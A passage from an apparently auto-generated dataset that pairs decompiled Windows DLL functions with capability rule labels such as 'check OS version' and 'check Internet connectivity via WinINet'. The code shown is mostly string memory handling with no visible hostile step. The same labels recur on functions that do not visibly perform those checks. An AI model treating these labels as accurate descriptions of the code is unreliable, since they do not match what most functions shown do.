0;\n        if (0xf < arg3[3]) {\n            piVar1 = *arg3;\n            piVar7 = piVar1;\n            if ((0xfff < arg3[3] + 1U) && (piVar7 = piVar1[-1],  0x1f < piVar1 + (-8 - piVar7)))\n            goto code_r0x000180008f98;\n            fcn.18008fb24(piVar7);\n        }\n    }\n    *arg3 = 0;\n    arg3[3] = 0xf;\n    arg3[2] = NULL;\n    fcn.18008fb00(var_20h ^ auStack136);\n    return;\n}\n",
        "token_count": 1351
    },
    "180008fa": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.180008fa0(ulong noname_0, ulong arg2, int64_t *arg3)\n\n{\n    uint64_t uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    ulong arg3_00;\n    uchar *puVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    uchar auStack136 [32];\n    uchar uStack104;\n    unkbyte7 Stack103;\n    uint uStack88;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    ulong uStack72;\n    int64_t *piStack56;\n    uchar uStack48;\n    unkbyte7 Stack47;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint64_t uStack16;\n    \n    uStack72 = 0xfffffffffffffffe;\n    uStack16 = *0x180123080 ^ auStack136;\n    uStack32 = *0x180101910;\n    uStack28 = *0x180101914;\n    uStack24 = *0x180101918;\n    uStack20 = *0x18010191c;\n    uStack48 = 0;\n    puVar4 = &uStack104;\n    piStack56 = arg3;\n    arg3_00 = fcn.18000de50(puVar4, arg3);\n    iVar3 = fcn.180008d40(puVar4, &uStack48, arg3_00);\n    if (iVar3 < 1) {\n        uVar1 = CONCAT44(uStack20, uStack24);\n        if (0xf < uVar1) {\n            iVar5 = CONCAT71(Stack47, uStack48);\n            iVar6 = iVar5;\n            if ((0xfff < uVar1 + 1) && (iVar6 = *(iVar5 + -8),  0x1f < (iVar5 - iVar6) - 8U)) {\ncode_r0x0001800091cc:\n                fcn.1800b3528(iVar6, uVar1 + 0x28);\n                goto code_r0x0001800091d2;\n            }\n            fcn.18008fb24(iVar6);\n        }\n        uStack32 = *0x180101910;\n        uStack28 = *0x180101914;\n        uStack24 = *0x180101918;\n        uStack20 = *0x18010191c;\n        uStack48 = 0;\n        if (arg3[3] < 0x10) {\ncode_r0x00018000919b:\n            *arg3 = 0;\n            arg3[3] = 0xf;\n            arg3[2] = 0;\n            fcn.18008fb00(uStack16 ^ auStack136);\n            return;\n        }\n        iVar6 = *arg3;\n        iVar5 = iVar6;\n        if ((arg3[3] + 1U < 0x1000) || (iVar5 = *(iVar6 + -8),  (iVar6 - iVar5) - 8U < 0x20)) {\n            fcn.18008fb24(iVar5);\n            goto code_r0x00018000919b;\n        }\n    }\n    else {\n        uStack88 = *0x180101910;\n        uStack84 = *0x180101914;\n        uStack80 = *0x180101918;\n        uStack76 = *0x18010191c;\n        uStack104 = 0;\n        puVar4 = &uStack104;\n        fcn.180011120(puVar4, 0x1800f47b4, 1);\n        fcn.18000a0f0(puVar4, &uStack48, arg2, &uStack104);\n        if (0xf < CONCAT44(uStack76, uStack80)) {\n            iVar5 = CONCAT71(Stack103, uStack104);\n            iVar6 = iVar5;\n            if ((0xfff < CONCAT44(uStack76, uStack80) + 1) && (iVar6 = *(iVar5 + -8),  0x1f < (iVar5 - iVar6) - 8U))\n            goto code_r0x0001800091d8;\n            fcn.18008fb24(iVar6);\n        }\n        uVar1 = CONCAT44(uStack20, uStack24);\n        if (0xf < uVar1) {\n            iVar5 = CONCAT71(Stack47, uStack48);\n            iVar6 = iVar5;\n            if ((0xfff < uVar1 + 1) && (iVar6 = *(iVar5 + -8),  0x1f < (iVar5 - iVar6) - 8U)) goto code_r0x0001800091cc;\n            fcn.18008fb24(iVar6);\n        }\n        uStack32 = *0x180101910;\n        uStack28 = *0x180101914;\n        uStack24 = *0x180101918;\n        uStack20 = *0x18010191c;\n        uStack48 = 0;\n        if (arg3[3] < 0x10) goto code_r0x00018000919b;\n        iVar6 = *arg3;\n        iVar5 = iVar6;\n        if ((arg3[3] + 1U < 0x1000) || (iVar5 = *(iVar6 + -8),  (iVar6 - iVar5) - 8U < 0x20)) {\n            fcn.18008fb24(iVar5);\n            goto code_r0x00018000919b;\n        }\n    }\ncode_r0x0001800091d2:\n    fcn.1800b3528();\ncode_r0x0001800091d8:\n    fcn.1800b3528();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 1310
    },
    "1800091e": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h_2\n// WARNING: Variable defined which should be unmapped: var_8h_2\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid fcn.1800091e0(ulong noname_0, ulong arg2, int64_t **arg3)\n\n{\n    int64_t *piVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    int32_t iVar4;\n    ulong uVar5;\n    uchar *puVar6;\n    int64_t iVar7;\n    int64_t *piVar8;\n    int64_t **arg3_00;\n    ulong var_8h;\n    ulong var_10h_2;\n    ulong var_18h;\n    uchar auStack312 [32];\n    ushort uStack280;\n    unkbyte6 Stack278;\n    uint uStack264;\n    uint uStack260;\n    uint uStack256;\n    uint uStack252;\n    ushort uStack248;\n    unkbyte6 Stack246;\n    ulong uStack232;\n    uint64_t uStack224;\n    ulong uStack216;\n    uchar auStack200 [128];\n    int64_t **ppiStack72;\n    uchar uStack64;\n    unkbyte7 Stack63;\n    int64_t iStack48;\n    uint64_t uStack40;\n    uint64_t uStack32;\n    ulong var_10h;\n    ulong var_8h_2;\n    \n    uStack216 = 0xfffffffffffffffe;\n    uStack32 = *0x180123080 ^ auStack312;\n    iStack48 = 0;\n    uStack40 = 0xf;\n    uStack64 = 0;\n    ppiStack72 = arg3;\n    uVar5 = fcn.1800687b0(auStack200);\n    arg3_00 = arg3;\n    if (0x7 < arg3[3]) {\n        arg3_00 = *arg3;\n    }\n    fcn.180068c50(uVar5, &uStack280, arg3_00, arg3_00 + arg3[2] * 2);\n    puVar6 = auStack200;\n    fcn.1800686c0(puVar6);\n    iVar4 = fcn.180008d40(puVar6, &uStack64, &uStack280);\n    if (iVar4 < 1) {\n        if (0xf < uStack40) {\n            iVar3 = CONCAT71(Stack63, uStack64);\n            iVar7 = iVar3;\n            if ((uStack40 + 1 < 0x1000) || (iVar7 = *(iVar3 + -8),  (iVar3 - iVar7) - 8U < 0x20)) {\n                fcn.18008fb24(iVar7);\n                goto code_r0x0001800092b5;\n            }\n            goto code_r0x0001800094dd;\n        }\ncode_r0x0001800092b5:\n        iStack48 = 0;\n        uStack40 = 0xf;\n        uStack64 = 0;\n        if (arg3[3] < 0x8) goto code_r0x0001800094a3;\n        piVar1 = *arg3;\n        piVar8 = piVar1;\n        if ((arg3[3] * 2 + 2U < 0x1000) || (piVar8 = piVar1[-1],  piVar1 + (-8 - piVar8) < 0x20)) {\n            fcn.18008fb24(piVar8);\n            goto code_r0x0001800094a3;\n        }\ncode_r0x0001800094e3:\n        fcn.1800b3528();\n    }\n    else {\n        uStack264 = *0x180101900;\n        uStack260 = *0x180101904;\n        uStack256 = *0x180101908;\n        uStack252 = *0x18010190c;\n        uStack280 = 0;\n        fcn.180010d70(&uStack280, 0x1800f47b8, 1);\n        uVar5 = fcn.1800687b0(auStack200);\n        puVar6 = &uStack64;\n        if (0xf < uStack40) {\n            puVar6 = CONCAT71(Stack63, uStack64);\n        }\n        fcn.180069050(uVar5, &uStack248, puVar6, puVar6 + iStack48);\n        puVar6 = auStack200;\n        fcn.1800686c0(puVar6);\n        fcn.18000a330(puVar6, &uStack248, arg2, &uStack280);\n        if (uStack224 < 8) {\ncode_r0x0001800093c5:\n            uStack232 = CONCAT44(*0x180101904, *0x180101900);\n            uStack224 = CONCAT44(*0x18010190c, *0x180101908);\n            uStack248 = 0;\n            if (7 < CONCAT44(uStack252, uStack256)) {\n                iVar3 = CONCAT62(Stack278, uStack280);\n                iVar7 = iVar3;\n                if ((0xfff < CONCAT44(uStack252, uStack256) * 2 + 2) &&\n                   (iVar7 = *(iVar3 + -8),  0x1f < (iVar3 - iVar7) - 8U)) goto code_r0x0001800094ef;\n                fcn.18008fb24(iVar7);\n            }\n            if (uStack40 < 0x10) {\ncode_r0x000180009456:\n                iStack48 = 0;\n                uStack40 = 0xf;\n                uStack64 = 0;\n                if (arg3[3] < 0x8) {\ncode_r0x0001800094a3:\n                    *arg3 = 0;\n                    arg3[3] = 0x7;\n                    arg3[2] = NULL;\n                    fcn.18008fb00(uStack32 ^ auStack312);\n                    return;\n                }\n                piVar1 = *arg3;\n                piVar8 = piVar1;\n                if ((arg3[3] * 2 + 2U < 0x1000) || (piVar8 = piVar1[-1],  piVar1 + (-8 - piVar8) < 0x20)) {\n                    fcn.18008fb24(piVar8);\n                    goto code_r0x0001800094a3;\n                }\n            }\n            else {\n                iVar3 = CONCAT71(Stack63, uStack64);\n                iVar7 = iVar3;\n                if (uStack40 + 1 < 0x1000) {\ncode_r0x000180009451:\n                    fcn.18008fb24(iVar7);\n                    goto code_r0x000180009456;\n                }\n                iVar7 = *(iVar3 + -8);\n                if ((iVar3 - iVar7) - 8U < 0x20) goto code_r0x000180009451;\n                fcn.1800b3528(iVar7, uStack40 + 0x28);\n            }\n            fcn.1800b3528();\ncode_r0x0001800094dd:\n            fcn.1800b3528();\n            goto code_r0x0001800094e3;\n        }\n        iVar3 = CONCAT62(Stack246, uStack248);\n        iVar7 = iVar3;\n        if ((uStack224 * 2 + 2 < 0x1000) || (iVar7 = *(iVar3 + -8),  (iVar3 - iVar7) - 8U < 0x20)) {\n            fcn.18008fb24(iVar7);\n            goto code_r0x0001800093c5;\n        }\n    }\n    fcn.1800b3528();\ncode_r0x0001800094ef:\n    fcn.1800b3528();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 1795
    },
    "18000950": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_20h\n\nvoid fcn.180009500(ulong noname_0, ulong *arg2, ulong arg3, int64_t **arg4)\n\n{\n    int64_t *piVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    uint32_t uVar4;\n    uchar *puVar5;\n    int64_t iVar6;\n    int64_t *piVar7;\n    uint64_t uVar8;\n    uint64_t uVar9;\n    uchar *puVar10;\n    uchar auStack152 [32];\n    uint uStack120;\n    int64_t **ppiStack112;\n    ulong uStack104;\n    int64_t **ppiStack96;\n    uchar uStack88;\n    unkbyte7 Stack87;\n    ulong var_40h;\n    uint64_t var_38h;\n    uint64_t var_30h;\n    ulong var_20h;\n    ulong var_18h;\n    ulong var_10h;\n    \n    uStack104 = 0xfffffffffffffffe;\n    var_30h = *0x180123080 ^ auStack152;\n    iVar6 = 0;\n    var_40h = 0;\n    var_38h = 0xf;\n    uStack88 = 0;\n    ppiStack96 = arg4;\n    fcn.180010fa0(&uStack88, 0x7fff);\n    ppiStack112 = arg4;\n    if (0xf < arg4[3]) {\n        ppiStack112 = *arg4;\n    }\n    puVar10 = &uStack88;\n    if (0xf < var_38h) {\n        puVar10 = CONCAT71(Stack87, uStack88);\n    }\n    if (0xf < arg2[3]) {\n        arg2 = *arg2;\n    }\n    uStack120 = 0x7fff;\n    uVar4 = (**0x1800de478)(arg2, 0, 0x1800f4657, puVar10);\n    if (uVar4 == 0) {\n        if (0xf < var_38h) {\n            iVar3 = CONCAT71(Stack87, uStack88);\n            iVar6 = iVar3;\n            if ((0xfff < var_38h + 1) && (iVar6 = *(iVar3 + -8),  0x1f < (iVar3 - iVar6) - 8U)) {\ncode_r0x000180009748:\n                fcn.1800b3528(iVar6, var_38h + 0x28);\n                goto code_r0x00018000974e;\n            }\n            fcn.18008fb24(iVar6);\n        }\n        var_40h = 0;\n        var_38h = 0xf;\n        uStack88 = 0;\n        if (0xf < arg4[3]) {\n            piVar1 = *arg4;\n            piVar7 = piVar1;\n            if ((0xfff < arg4[3] + 1U) && (piVar7 = piVar1[-1],  0x1f < piVar1 + (-8 - piVar7))) {\ncode_r0x00018000974e:\n                fcn.1800b3528();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            fcn.18008fb24(piVar7);\n        }\n    }\n    else {\n        uVar8 = uVar4;\n        puVar10 = CONCAT71(Stack87, uStack88);\n        uVar9 = var_38h;\n        do {\n            puVar5 = &uStack88;\n            if (0xf < uVar9) {\n                puVar5 = puVar10;\n            }\n            if (puVar5[iVar6] == '\\0') {\n                puVar5 = &uStack88;\n                if (0xf < uVar9) {\n                    puVar5 = puVar10;\n                }\n                puVar5[iVar6] = 0x2c;\n                puVar10 = CONCAT71(Stack87, uStack88);\n                uVar9 = var_38h;\n            }\n            iVar6 = iVar6 + 1;\n            uVar8 = uVar8 - 1;\n        } while (uVar8 != 0);\n        puVar5 = &uStack88;\n        if (0xf < uVar9) {\n            puVar5 = puVar10;\n        }\n        iVar6 = -1;\n        do {\n            iVar6 = iVar6 + 1;\n        } while (puVar5[iVar6] != '\\0');\n        fcn.180011120(arg3, puVar5, iVar6);\n        if (0xf < var_38h) {\n            iVar3 = CONCAT71(Stack87, uStack88);\n            iVar6 = iVar3;\n            if ((0xfff < var_38h + 1) && (iVar6 = *(iVar3 + -8),  0x1f < (iVar3 - iVar6) - 8U))\n            goto code_r0x000180009748;\n            fcn.18008fb24(iVar6);\n        }\n        var_40h = 0;\n        var_38h = 0xf;\n        uStack88 = 0;\n        if (0xf < arg4[3]) {\n            piVar1 = *arg4;\n            piVar7 = piVar1;\n            if ((0xfff < arg4[3] + 1U) && (piVar7 = piVar1[-1],  0x1f < piVar1 + (-8 - piVar7)))\n            goto code_r0x00018000974e;\n            fcn.18008fb24(piVar7);\n        }\n    }\n    *arg4 = 0;\n    arg4[3] = 0xf;\n    arg4[2] = NULL;\n    fcn.18008fb00(var_30h ^ auStack152);\n    return;\n}\n",
        "token_count": 1348
    },
    "18000976": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h_2\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid fcn.180009760(ulong noname_0, ulong arg2, ulong arg3, int64_t *arg4)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    ulong uVar3;\n    ushort *arg1;\n    uchar *puVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    ulong var_8h;\n    ulong var_10h_2;\n    ulong var_18h;\n    uchar auStack328 [32];\n    ushort uStack296;\n    unkbyte6 Stack294;\n    uint uStack280;\n    uint uStack276;\n    uint uStack272;\n    uint uStack268;\n    ushort uStack264;\n    unkbyte6 Stack262;\n    ulong uStack248;\n    uint64_t uStack240;\n    ulong uStack232;\n    uchar auStack216 [128];\n    int64_t *piStack88;\n    uchar uStack80;\n    unkbyte7 Stack79;\n    int64_t iStack64;\n    uint64_t uStack56;\n    uint64_t uStack48;\n    ulong var_10h;\n    ulong var_8h_2;\n    \n    uStack232 = 0xfffffffffffffffe;\n    uStack48 = *0x180123080 ^ auStack328;\n    iStack64 = 0;\n    uStack56 = 0xf;\n    uStack80 = 0;\n    arg1 = &uStack296;\n    piStack88 = arg4;\n    uVar3 = fcn.18000de50(arg1, arg4);\n    iVar2 = fcn.180009500(arg1, arg2, &uStack80, uVar3);\n    if (iVar2 < 1) {\n        if (0xf < uStack56) {\n            iVar6 = CONCAT71(Stack79, uStack80);\n            iVar5 = iVar6;\n            if ((uStack56 + 1 < 0x1000) || (iVar5 = *(iVar6 + -8),  (iVar6 - iVar5) - 8U < 0x20)) {\n                fcn.18008fb24(iVar5);\n                goto code_r0x00018000980a;\n            }\n            goto code_r0x000180009a21;\n        }\ncode_r0x00018000980a:\n        iStack64 = 0;\n        uStack56 = 0xf;\n        uStack80 = 0;\n        if (arg4[3] < 0x10) goto code_r0x0001800099ec;\n        iVar5 = *arg4;\n        iVar6 = iVar5;\n        if ((arg4[3] + 1U < 0x1000) || (iVar6 = *(iVar5 + -8),  (iVar5 - iVar6) - 8U < 0x20)) {\n            fcn.18008fb24(iVar6);\n            goto code_r0x0001800099ec;\n        }\ncode_r0x000180009a27:\n        fcn.1800b3528();\n    }\n    else {\n        uStack280 = *0x180101900;\n        uStack276 = *0x180101904;\n        uStack272 = *0x180101908;\n        uStack268 = *0x18010190c;\n        uStack296 = 0;\n        fcn.180010d70(&uStack296, 0x1800f47c0, 1);\n        uVar3 = fcn.1800687b0(auStack216);\n        puVar4 = &uStack80;\n        if (0xf < uStack56) {\n            puVar4 = CONCAT71(Stack79, uStack80);\n        }\n        fcn.180069050(uVar3, &uStack264, puVar4, puVar4 + iStack64);\n        puVar4 = auStack216;\n        fcn.1800686c0(puVar4);\n        fcn.18000a330(puVar4, &uStack264, arg3, &uStack296);\n        if (uStack240 < 8) {\ncode_r0x000180009916:\n            uStack248 = CONCAT44(*0x180101904, *0x180101900);\n            uStack240 = CONCAT44(*0x18010190c, *0x180101908);\n            uStack264 = 0;\n            if (7 < CONCAT44(uStack268, uStack272)) {\n                iVar6 = CONCAT62(Stack294, uStack296);\n                iVar5 = iVar6;\n                if ((0xfff < CONCAT44(uStack268, uStack272) * 2 + 2) &&\n                   (iVar5 = *(iVar6 + -8),  0x1f < (iVar6 - iVar5) - 8U)) goto code_r0x000180009a33;\n                fcn.18008fb24(iVar5);\n            }\n            if (uStack56 < 0x10) {\ncode_r0x0001800099a4:\n                iStack64 = 0;\n                uStack56 = 0xf;\n                uStack80 = 0;\n                if (arg4[3] < 0x10) {\ncode_r0x0001800099ec:\n                    *arg4 = 0;\n                    arg4[3] = 0xf;\n                    arg4[2] = 0;\n                    fcn.18008fb00(uStack48 ^ auStack328);\n                    return;\n                }\n                iVar5 = *arg4;\n                iVar6 = iVar5;\n                if ((arg4[3] + 1U < 0x1000) || (iVar6 = *(iVar5 + -8),  (iVar5 - iVar6) - 8U < 0x20)) {\n                    fcn.18008fb24(iVar6);\n                    goto code_r0x0001800099ec;\n                }\n            }\n            else {\n                iVar6 = CONCAT71(Stack79, uStack80);\n                iVar5 = iVar6;\n                if (uStack56 + 1 < 0x1000) {\ncode_r0x00018000999f:\n                    fcn.18008fb24(iVar5);\n                    goto code_r0x0001800099a4;\n                }\n                iVar5 = *(iVar6 + -8);\n                if ((iVar6 - iVar5) - 8U < 0x20) goto code_r0x00018000999f;\n                fcn.1800b3528(iVar5, uStack56 + 0x28);\n            }\n            fcn.1800b3528();\ncode_r0x000180009a21:\n            fcn.1800b3528();\n            goto code_r0x000180009a27;\n        }\n        iVar6 = CONCAT62(Stack262, uStack264);\n        iVar5 = iVar6;\n        if ((uStack240 * 2 + 2 < 0x1000) || (iVar5 = *(iVar6 + -8),  (iVar6 - iVar5) - 8U < 0x20)) {\n            fcn.18008fb24(iVar5);\n            goto code_r0x000180009916;\n        }\n    }\n    fcn.1800b3528();\ncode_r0x000180009a33:\n    fcn.1800b3528();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 1652
    },
    "180009c0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.180009c00(ulong noname_0, ulong arg2, int64_t **arg3)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    ulong *puVar3;\n    ulong uVar4;\n    uchar *arg1;\n    int64_t *piVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    int64_t *piVar8;\n    int64_t **arg2_00;\n    uint64_t uVar9;\n    ulong *arg3_00;\n    uchar auStack520 [32];\n    uchar *puStack488;\n    ulong uStack480;\n    int64_t *piStack472;\n    uint uStack464;\n    uint uStack460;\n    int64_t *piStack456;\n    uint64_t uStack448;\n    int64_t **ppiStack440;\n    ushort uStack432;\n    unkbyte6 Stack430;\n    ulong uStack416;\n    uint64_t uStack408;\n    uchar uStack400;\n    unkbyte7 Stack399;\n    ulong uStack384;\n    uint64_t uStack376;\n    uchar uStack368;\n    unkbyte7 Stack367;\n    ulong uStack352;\n    uint64_t uStack344;\n    ushort uStack336;\n    unkbyte6 Stack334;\n    ulong uStack320;\n    uint64_t uStack312;\n    ushort uStack304;\n    unkbyte6 Stack302;\n    uint uStack288;\n    uint uStack284;\n    uint uStack280;\n    uint uStack276;\n    uchar uStack272;\n    unkbyte7 Stack271;\n    ulong uStack256;\n    uint64_t uStack248;\n    ulong uStack240;\n    int64_t **ppiStack232;\n    uchar auStack224 [40];\n    int64_t aiStack184 [16];\n    int64_t **ppiStack56;\n    uint64_t uStack48;\n    \n    uStack240 = 0xfffffffffffffffe;\n    uStack48 = *0x180123080 ^ auStack520;\n    ppiStack56 = arg3;\n    if ((arg3[2] == NULL) && (arg3 != 0x180125598)) {\n        uVar4 = 0x180125598;\n        if (7 < *0x1801255b0) {\n            uVar4 = *0x180125598;\n        }\n        fcn.180010d70(arg3, uVar4, *0x1801255a8);\n    }\n    uStack288 = *0x180101900;\n    uStack284 = *0x180101904;\n    uStack280 = *0x180101908;\n    uStack276 = *0x18010190c;\n    uStack304 = 0;\n    fcn.180010d70(&uStack304, 0x1800f47c8, 1);\n    ppiStack440 = &piStack472;\n    piStack456 = NULL;\n    uStack448 = 0;\n    piVar5 = arg3[2];\n    arg2_00 = arg3;\n    if (0x7 < arg3[3]) {\n        arg2_00 = *arg3;\n    }\n    if (piVar5 < 0x8) {\n        piStack472 = *arg2_00;\n        uStack464 = *(arg2_00 + 1);\n        uStack460 = *(arg2_00 + 0xc);\n        uVar9 = 7;\n    }\n    else {\n        uVar9 = piVar5 | 7;\n        if (0x7ffffffffffffffe < uVar9) {\n            uVar9 = 0x7ffffffffffffffe;\n        }\n        piStack472 = fcn.180011cf0(&piStack472, uVar9 + 1);\n        fcn.1800ade80(piStack472, arg2_00, piVar5 * 2 + 2);\n    }\n    ppiStack232 = &piStack472;\n    uStack352 = CONCAT44(*0x180101914, *0x180101910);\n    uStack344 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack368 = 0;\n    piStack456 = piVar5;\n    uStack448 = uVar9;\n    fcn.180011120(&uStack368, 0x1800f466e, 0);\n    uStack384 = CONCAT44(*0x180101914, *0x180101910);\n    uStack376 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack400 = 0;\n    fcn.180011120(&uStack400, 0x1800f47cc, 6);\n    uStack416 = CONCAT44(*0x180101904, *0x180101900);\n    uStack408 = CONCAT44(*0x18010190c, *0x180101908);\n    uStack432 = 0;\n    fcn.180010d70(&uStack432, 0x1800f47d8, 4);\n    arg1 = auStack224;\n    uStack480 = fcn.18000da90(arg1, &piStack472);\n    puStack488 = &uStack368;\n    puVar3 = fcn.180004d80(arg1, &uStack272, &uStack432, &uStack400);\n    uVar4 = fcn.1800687b0(aiStack184);\n    arg3_00 = puVar3;\n    if (0xf < puVar3[3]) {\n        arg3_00 = *puVar3;\n    }\n    fcn.180069050(uVar4, &uStack336, arg3_00, puVar3[2] + arg3_00);\n    piVar5 = aiStack184;\n    fcn.1800686c0(piVar5);\n    if (uStack248 < 0x10) {\ncode_r0x000180009e4c:\n        uStack256 = CONCAT44(*0x180101914, *0x180101910);\n        uStack248 = CONCAT44(*0x18010191c, *0x180101918);\n        uStack272 = 0;\n        if (7 < uStack448) {\n            piVar5 = piStack472;\n            if ((0xfff < uStack448 * 2 + 2) && (piVar5 = piStack472[-1],  0x1f < piStack472 + (-8 - piVar5)))\n            goto code_r0x00018000a0ce;\n            fcn.18008fb24(piVar5);\n        }\n        piStack456 = NULL;\n        uStack448 = 7;\n        piStack472 = piStack472 & 0xffffffffffff0000;\n        fcn.18000a330(piVar5, &uStack336, arg2, &uStack304);\n        if (7 < uStack312) {\n            iVar7 = CONCAT62(Stack334, uStack336);\n            iVar6 = iVar7;\n            if (uStack312 * 2 + 2 < 0x1000) {\ncode_r0x000180009f00:\n                fcn.18008fb24(iVar6);\n                goto code_r0x000180009f05;\n            }\n            iVar6 = *(iVar7 + -8);\n            if ((iVar7 - iVar6) - 8U < 0x20) goto code_r0x000180009f00;\n            fcn.1800b3528(iVar6, uStack312 * 2 + 0x29);\ncode_r0x00018000a0da:\n            fcn.1800b3528();\ncode_r0x00018000a0e0:\n            fcn.1800b3528();\ncode_r0x00018000a0e6:\n            fcn.1800b3528();\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\ncode_r0x000180009f05:\n        uStack320 = CONCAT44(*0x180101904, *0x180101900);\n        uStack312 = CONCAT44(*0x18010190c, *0x180101908);\n        uStack336 = 0;\n        if (7 < uStack408) {\n            iVar7 = CONCAT62(Stack430, uStack432);\n            iVar6 = iVar7;\n            if ((0xfff < uStack408 * 2 + 2) && (iVar6 = *(iVar7 + -8),  0x1f < (iVar7 - iVar6) - 8U))\n            goto code_r0x00018000a0da;\n            fcn.18008fb24(iVar6);\n        }\n        uStack416 = CONCAT44(*0x180101904, *0x180101900);\n        uStack408 = CONCAT44(*0x18010190c, *0x180101908);\n        uStack432 = 0;\n        if (0xf < uStack376) {\n            iVar7 = CONCAT71(Stack399, uStack400);\n            iVar6 = iVar7;\n            if ((0xfff < uStack376 + 1) && (iVar6 = *(iVar7 + -8),  0x1f < (iVar7 - iVar6) - 8U))\n            goto code_r0x00018000a0e0;\n            fcn.18008fb24(iVar6);\n        }\n        uStack384 = CONCAT44(*0x180101914, *0x180101910);\n        uStack376 = CONCAT44(*0x18010191c, *0x180101918);\n        uStack400 = 0;\n        if (0xf < uStack344) {\n            iVar7 = CONCAT71(Stack367, uStack368);\n            iVar6 = iVar7;\n            if ((0xfff < uStack344 + 1) && (iVar6 = *(iVar7 + -8),  0x1f < (iVar7 - iVar6) - 8U))\n            goto code_r0x00018000a0e6;\n            fcn.18008fb24(iVar6);\n        }\n        uStack352 = CONCAT44(*0x180101914, *0x180101910);\n        uStack344 = CONCAT44(*0x18010191c, *0x180101918);\n        uStack368 = 0;\n        if (CONCAT44(uStack276, uStack280) < 8) {\ncode_r0x00018000a044:\n            if (arg3[3] < 0x8) {\ncode_r0x00018000a07f:\n                arg3[2] = NULL;\n                arg3[3] = 0x7;\n                *arg3 = 0;\n                fcn.18008fb00(uStack48 ^ auStack520);\n                return;\n            }\n            piVar5 = *arg3;\n            piVar8 = piVar5;\n            if ((arg3[3] * 2 + 2U < 0x1000) || (piVar8 = piVar5[-1],  piVar5 + (-8 - piVar8) < 0x20)) {\n                fcn.18008fb24(piVar8);\n                goto code_r0x00018000a07f;\n            }\n        }\n        else {\n            iVar6 = CONCAT44(uStack276, uStack280) * 2;\n            iVar2 = CONCAT62(Stack302, uStack304);\n            iVar7 = iVar2;\n            if (iVar6 + 2U < 0x1000) {\ncode_r0x00018000a03e:\n                fcn.18008fb24(iVar7);\n                goto code_r0x00018000a044;\n            }\n            iVar7 = *(iVar2 + -8);\n            if ((iVar2 - iVar7) - 8U < 0x20) goto code_r0x00018000a03e;\n            fcn.1800b3528(uStack352, iVar7, iVar6 + 0x29);\n        }\n        fcn.1800b3528();\n    }\n    else {\n        piVar8 = CONCAT71(Stack271, uStack272);\n        piVar5 = piVar8;\n        if ((uStack248 + 1 < 0x1000) || (piVar5 = piVar8[-1],  piVar8 + (-8 - piVar5) < 0x20)) {\n            fcn.18008fb24(piVar5);\n            goto code_r0x000180009e4c;\n        }\n    }\n    fcn.1800b3528();\ncode_r0x00018000a0ce:\n    fcn.1800b3528();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 2804
    },
    "18000a71": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.18000a710(ulong noname_0, ulong arg2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    ulong *puVar3;\n    code *pcVar4;\n    int64_t iVar5;\n    ulong uVar6;\n    ulong *puVar7;\n    int64_t iVar8;\n    int64_t iVar9;\n    ulong *puStack184;\n    uchar auStack176 [24];\n    int64_t *piStack152;\n    ulong *puStack144;\n    uchar auStack136 [24];\n    int64_t *piStack112;\n    ushort uStack104;\n    unkbyte6 Stack102;\n    uint uStack88;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    ushort uStack72;\n    unkbyte6 Stack70;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    ulong uStack40;\n    \n    uStack40 = 0xfffffffffffffffe;\n    puStack184 = NULL;\n    fcn.180010540(auStack176);\n    fcn.1800131f0(&puStack184, 0x1800f47e8, 0x1800f47ee);\n    uVar6 = fcn.180013060(&uStack104, arg2, &puStack184, 0x1800f47d4);\n    fcn.18000d960(arg2, uVar6);\n    if (7 < 